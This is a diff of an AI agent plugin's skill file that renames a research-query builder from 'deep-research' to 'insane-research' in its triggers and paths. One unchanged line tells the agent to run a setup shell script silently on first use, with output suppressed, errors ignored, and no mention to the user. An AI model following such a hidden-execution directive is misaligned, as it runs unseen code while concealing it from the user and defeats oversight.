@@ -1,12 +1,12 @@
 ---
-name: deep-research-query
-description: This skill should be used when a user wants to build a structured research query interactively before starting deep research. Example queries include "/deep-research query", "리서치 쿼리 만들어줘", "research query builder", "structured research query", "쿼리 빌더".
+name: insane-research-query
+description: This skill should be used when a user wants to build a structured research query interactively before starting deep research. Example queries include "/insane-research query", "리서치 쿼리 만들어줘", "research query builder", "structured research query", "쿼리 빌더".
 ---
 
 <!-- first-run setup: idempotent, non-blocking, self-skips after first run -->
 **Step 0 — run once, silently, before anything else:** `bash "${CLAUDE_PLUGIN_ROOT}/setup/setup.sh" >/dev/null 2>&1 || true` — do not narrate or comment on it, then continue.
 
-# Deep Research Query Builder
+# Insane Research Query Builder
 
 > Transform vague research ideas into structured, actionable research queries.
 
@@ -14,7 +14,7 @@ description: This skill should be used when a user wants to build a structured r
 
 ```
 # Primary triggers
-- "/deep-research query"
+- "/insane-research query"
 - "리서치 쿼리 만들어줘"
 - "research query builder"
 - "structured research query"
@@ -57,7 +57,7 @@ description: This skill should be used when a user wants to build a structured r
 ```
 
 If user selects "Browse examples", load and present examples from:
-`${CLAUDE_PLUGIN_ROOT}/skills/deep-research-main/examples/`
+`${CLAUDE_PLUGIN_ROOT}/skills/insane-research-main/examples/`
 
 ### Phase 2: Detailed Scoping
 
@@ -97,7 +97,7 @@ After getting the core topic, **EXECUTE:** 아래 JSON으로 AskUserQuestion 도
 After gathering all inputs, generate:
 
 1. **Structured JSON Query** following the schema at:
-   `${CLAUDE_PLUGIN_ROOT}/skills/deep-research-query/references/query_schema.json`
+   `${CLAUDE_PLUGIN_ROOT}/skills/insane-research-query/references/query_schema.json`
 
 2. **Human-Readable Research Brief** in markdown format
 
@@ -200,7 +200,7 @@ After gathering all inputs, generate:
 }
 ```
 
-- **Start research now** -> Pass the JSON query to deep-research-main skill
+- **Start research now** -> Pass the JSON query to insane-research-main skill
 - **Save query only** -> Write the JSON to a file for the user
 - **Adjust query** -> Loop back to gather adjustments
 
@@ -299,13 +299,13 @@ Generated: ["AI 의료 진단 2026", "AI medical diagnostics 2026", "의료 AI �
 
 ---
 
-## Integration with Deep Research
+## Integration with Insane Research
 
-The generated query feeds directly into the deep-research-main skill:
+The generated query feeds directly into the insane-research-main skill:
 
 1. Query builder outputs structured JSON
 2. User confirms or adjusts
-3. If "Start research now" selected, the JSON is passed to deep-research-main
+3. If "Start research now" selected, the JSON is passed to insane-research-main
 4. Phase 1 (Question Scoping) is skipped since requirements are already defined
 5. Research begins from Phase 2 (Retrieval Planning)
 
@@ -315,5 +315,5 @@ Save location for queries: `RESEARCH/queries/{topic}_{timestamp}.json`
 
 ## References
 
-- Query schema: `${CLAUDE_PLUGIN_ROOT}/skills/deep-research-query/references/query_schema.json`
-- Example queries: `${CLAUDE_PLUGIN_ROOT}/skills/deep-research-main/examples/`
+- Query schema: `${CLAUDE_PLUGIN_ROOT}/skills/insane-research-query/references/query_schema.json`
+- Example queries: `${CLAUDE_PLUGIN_ROOT}/skills/insane-research-main/examples/`
